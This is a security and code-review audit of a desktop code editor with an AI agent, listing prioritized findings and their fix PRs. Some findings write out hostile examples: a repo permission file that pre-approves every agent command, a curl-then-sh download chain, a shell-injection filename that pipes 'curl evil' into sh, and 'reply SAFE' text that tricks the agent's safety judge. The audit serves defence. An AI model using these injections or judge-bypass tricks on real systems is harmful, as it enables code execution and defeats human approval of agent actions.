# Fahh Editor: deep review (Nov 2026)

Base: PR #132 head `f31de9e` (unmerged). Every fix PR below is stacked on it: merge #132 first. PRs target `main` so CI runs on them.
Method: I read the code, ran unit and integration tests (vitest, cargo test, clippy) and ran `pnpm audit`. No app was opened: the user paused GUI testing, so items that need the real app are marked **needs GUI verification (paused by user)**.

Status legend: **Fixed (PR)** · **Open** (not fixed in this round).

## PRs (priority order, all open, none merged)
| PR | Scope |
|---|---|
| #139 | Security: a repo can no longer pre-approve agent commands, no shell injection in Run, stop_run limits, orphaned processes, least-privilege capabilities (stacked on #138) |
| #135 | Notebook: single writer for .ipynb, outputs keyed by stable cell id (report items 4 and 5) |
| #138 | Safe saves: atomic writes, BOM kept, non-UTF-8 never mangled, literal replace |
| #133 | TS completion and hover hang without typescript-language-server (item 1) |
| #137 | Removes the shipped fake data (extension stats, invented plugins, seeded canvas note) |
| #134 | Status-bar count matches Problems; theme display names (items 2 and 3) |
| #136 | New Window opens empty; Settings no longer hides the Explorer; clipboard failures surface (items 6, 7, 9) |
| #141 | Dependency CVEs: dompurify, markdown-it |
| #142 | Backend robustness: Windows .cmd shims, .vsix zip bomb, kernel script path |
| #140 | Perf and a11y: cursor status isolated, leaked listeners, palette label |

## P0

| # | Finding | file:line | Impact | Status |
|---|---|---|---|---|
| P0-1 | A cloned repo can pre-approve agent commands. Allow rules were read from `<workspace>/.fahh/permissions.json`, which any repo can commit (`{"action":"allow","kind":"run","pattern":"*"}`) | `src-tauri/src/agent/perm.rs:293-315` | Opening a malicious repo and using the agent runs commands with no approval (two-step `curl -o x.sh`, then `sh x.sh`), plus prompt injection | **Fixed: #139.** The repo file can only deny or ask. "Always allow" answers live in the app data dir, keyed by folder |
| P0-2 | Notebook: two writers rewrite one `.ipynb`. The runner saved outputs by cell index while the view saved edits | `NotebookKernel.tsx:293`, `fahh_kernel.py:155` | Outputs land in the wrong cell and edits are lost (the user lost a `!pip install` cell) | **Fixed: #135.** One writer, stable cell ids. Needs GUI verification (paused by user) |
| P0-3 | Fake data shipped: Problems sample entries (fixed in #132), invented extension stats and ratings, an invented "installed plugins" list, a seeded marketing note | `ExtensionsPanel/index.tsx:47-210,378-389`, `core/plugin.rs:119-250`, `spatialStore.ts:118`, `StickyNoteNodeView.tsx:39` | Users see numbers and features that do not exist | **Fixed: #137** |

## P1

| # | Finding | file:line | Impact | Status |
|---|---|---|---|---|
| P1-1 | TS completion stuck on "Loading..." and hover blank without typescript-language-server. `setModeConfiguration` on Monaco 0.52's TS/CSS/HTML modes only disposes their worker (it never re-registers providers), and every failed restart did it | `src/lib/lsp/monacoLsp.ts:150-180` | Completion and hover dead in every TS/JS file on machines without the server | **Fixed: #133.** Needs GUI verification (paused by user) |
| P1-2 | Shell injection through file names in Run (Java, C/C++, Kotlin) | `src-tauri/src/core/runner.rs:173,197,258` | Running a repo file named `` x$(curl evil\|sh).c `` executes the payload | **Fixed: #139.** sh single quotes; cmd refuses `% " \n` |
| P1-3 | `stop_run` kills any pid the webview passes, and on Unix only the top pid | `runner.rs:693-719` | A recycled pid kills an unrelated process tree. On Unix the compiled program keeps running and Run stays "running" | **Fixed: #139.** Only pids it started, process-group kill |
| P1-4 | Child processes orphaned on exit: LSP servers, debug adapters, runs and kernels | `lib.rs:169`, `lsp_client.rs:219`, `debugger.rs:267`, `runner.rs:586` | Leftover node, rust-analyzer and python processes, and held ports | **Fixed: #139.** `RunEvent::Exit` kills and reaps all of them. Per-window cleanup of LSP and kernels: **Open** |
| P1-5 | Saves not atomic; non-UTF-8 files mangled with U+FFFD; BOM dropped | `core/workspace.rs:82,92`, `git.rs:817`, `state.rs:42` | Data loss on a crash or full disk; Latin-1 and UTF-16 files destroyed on save; spurious git diffs | **Fixed: #138** |
| P1-6 | Literal search-and-replace expands `$1` / `$name` | `core/workspace.rs:480` | Replacing with `$price` wrote empty strings across the workspace | **Fixed: #138** |
| P1-7 | Over-broad Tauri capabilities: `shell:allow-execute/spawn/stdin-write/kill`, `fs:write-all/remove/rename`, unused `execute_command` IPC (runs any shell string) | `capabilities/default.json`, `lib.rs:52` | Any script injection becomes full code execution | **Fixed: #139.** Trimmed to what the frontend uses: shell `open`, fs read |
| P1-8 | No CSP (`"csp": null`) | `tauri.conf.json:47` | No containment for injected script | **Open.** Needs GUI verification before it can ship: the browser viewport, previews, Monaco workers and BYO-key AI hosts all need checking. The draft policy is below |
| P1-9 | Status-bar error count stale vs Problems; breadcrumb counted by file-name suffix | `EditorPane.tsx:345-360`, `StatusHud.tsx:20`, `Breadcrumbs/index.tsx:77` | Wrong numbers on screen | **Fixed: #134** |
| P1-10 | Known CVEs in shipped JS deps: dompurify ≤3.4.16 (critical/high sanitizer bypasses; it sanitizes notebook and Markdown HTML), markdown-it <14.3.3 (high, DoS) | `package.json` | XSS through a crafted notebook or Markdown file | **Fixed: #141** |
| P1-11 | Heavy sync commands run on the UI thread: `search_workspace`, `replace_in_workspace`, `get_file_tree`, `git_status`, `git_file_log`, `get_tool_status` | `workspace.rs:69,213,366`, `git.rs:440,664,862,901`, `installer.rs:66` | The window freezes on large repos and WSL paths | **Open.** Make them `async` + `spawn_blocking` (git.rs already has `off_thread`) |
| P1-12 | Windows `.cmd` shims (npm, npx, ts-node) never found by `Command::new` | `installer.rs:35-50`, `runner.rs:132-143` | TS Run and npm-based tool installs fail on Windows | **Fixed: #142.** `proc::cmd` resolves bare names through PATH+PATHEXT on Windows (one fix for every caller) |
| P1-13 | LSP lifecycle: check-then-spawn race (two servers), servers keyed by language only (a second window reuses the first root), messages emitted to all windows, a crashed server never restarted | `lsp_client.rs:150-230` | Duplicate diagnostics, wrong project in window 2 | **Open** |

## P2

| # | Finding | file:line | Impact | Status |
|---|---|---|---|---|
| P2-1 | New Window reopened the last folder | `App.tsx:193` (`restoreLast`) | Surprising, and not VS Code behaviour | **Fixed: #136** |
| P2-2 | Settings button hid the Explorer side bar: a group holding only Settings was classed by geometry as the side bar | `lib/workbench.ts:41,238-253` | The Explorer vanished | **Fixed: #136.** Needs GUI verification (paused by user) |
| P2-3 | 17 copy-to-clipboard calls swallowed errors | FileTree, MenuBar, App, Workbench, Roundtable, AgentPanel, agentStore, XtermPane, NotebookKernel | Silent failed copies | **Fixed: #136.** `copyText()` with an error toast |
| P2-4 | Theme name shown from its id ("Github Dark", "Cate Obsidian") | `App.tsx:788` | Cosmetic | **Fixed: #134** |
| P2-5 | Monaco "Cannot read properties of null (reading 'clone')" page error | Monaco suggest internals; no `.clone()` in our code | One page error during a scripted setValue | **Open.** Probably the worker disposed under the suggest widget (P1-1). Needs GUI verification (paused by user) |
| P2-6 | Root `App` re-renders on every cursor move (subscribes to `cursorPosition`) | `App.tsx:172` | Typing and cursor moves re-render the 800-line shell | **Fixed: #140** |
| P2-7 | Whole-store `useEditorStore()` / `useAgentStore()` / `useSpatialStore()` subscriptions re-render on every keystroke or stream token | `EditorPane.tsx:63`, `TabBar.tsx:11`, `MenuBar/index.tsx:147`, `AgentPanel/Transcript.tsx:131`, `composer.tsx:80`, `SpatialCanvas.tsx:25` … | CPU on long sessions | **Open** |
| P2-8 | No code splitting: 5.1 MB main chunk, every panel eager | `src/views/index.tsx:12-30`, `vite.config.ts` | Startup time | **Open.** `React.lazy` for the panels that start hidden |
| P2-9 | Tauri `listen` leak when a panel unmounts before `listen()` resolves | `RunPanel/index.tsx:145-160`, `NotebookKernel.tsx:195` | Duplicate handlers after fast toggles | **Fixed: #140** |
| P2-10 | Doubled TS/CSS/HTML suggestions while a language server is ready (Monaco 0.52 cannot switch its built-in providers off at runtime) | `monacoLsp.ts` | Duplicate completion items | **Open.** Needs a provider wrapper or a Monaco upgrade |
| P2-11 | Kernel runner script written to a predictable shared temp path | `runner.rs:296-303` | On a multi-user `/tmp`, code can be planted | **Fixed: #142.** Written to the app data dir |
| P2-12 | .vsix zip bomb: unbounded `read_to_string` of an entry | `extensions.rs:43-47` | Memory exhaustion | **Fixed: #142.** Entries capped at 8 MB |
| P2-13 | Smart-mode judge sees the raw command, which can carry "reply SAFE" text | `agent/runner.rs:217-224` | Auto-run of a bad command | **Open.** Fence the command as data; keep the deny floor |
| P2-14 | AppleScript injection through folder name | `terminal.rs:227-230` | macOS: code run on "open in terminal" | **Open** |
| P2-15 | Debug sessions not reaped when the adapter exits by itself | `debugger.rs:203-206` | Zombie until `debug_stop` | **Open** |
| P2-16 | R runs broken (`"<"` passed as a literal argument) | `runner.rs:238` | Rscript fails | **Fixed: #139** |
| P2-17 | `child.wait().expect()` in the run thread | `runner.rs:666` | Exit event never sent on failure | **Fixed: #139** |
| P2-18 | Dev-only CVEs: vite 5 / esbuild / vitest 2 / tinypool / postcss chain | devDependencies | Dev server and test runner only, not shipped | **Partly fixed: #141** (transitive patch bumps within range). vite 6 and vitest 3+ majors: **Open** |
| P2-19 | `roundtable.ts` hard-codes a raw-IP http server as the default | `src/lib/roundtable.ts:10` | Not sample data, but plain http to a fixed IP for everyone | **Open**, user decision |
| P2-20 | Accessibility: command palette clear button has no label; extension rows are clickable `<div>`s | `CommandPalette.tsx:151`, `ExtensionsPanel/index.tsx:816` | Screen readers and keyboard users | **Fixed: #140** |
| P2-21 | `--provider mock` reachable in the user-facing agent CLI | `agent/cli.rs:149` | A test harness in the product | **Open**, keep or gate behind `cfg(debug_assertions)` |

Checked and fine: PTY lifecycle (job object, process-group kill), git network commands (arg vectors, off the main thread), no zip-slip (a .vsix is read in memory only), notebook and Markdown HTML sanitized in a shadow root, the agent `run_command` timeout and kill_on_drop, `open_new_window` async. There is no updater plugin, so no signature check to review. `cargo audit` is not installed on the build machine; the Rust dependency CVE check is **Open** (add `rustsec/audit-check` to CI).

## Needs GUI verification (paused by user)
- #133 TS completion and hover with the server missing; P2-5 'clone' error.
- #134 status-bar count next to Problems on bad.py.
- #135 run a cell, move it while it runs, check the .ipynb on disk; Run all after an outside edit.
- #136 New Window opens empty; Settings twice with no files open.
- #137 Extensions panel online and offline; new Spatial canvas.
- #138 large files (10 MB+), many tabs, watcher storms.
- CSP (P1-8) before it can ship.
- From the E2E report: notebook A/B/M/Y keys (#132), Source Control flows, the WSL Explorer folder.

## Draft CSP (P1-8, not shipped)
`default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: asset: http://asset.localhost https:; font-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost https: http://localhost:* http://127.0.0.1:*; worker-src 'self' blob:; frame-src *; object-src 'none'; base-uri 'self'`. `'unsafe-eval'` is needed by `welcome.ts` `syntaxError` (`new Function`).
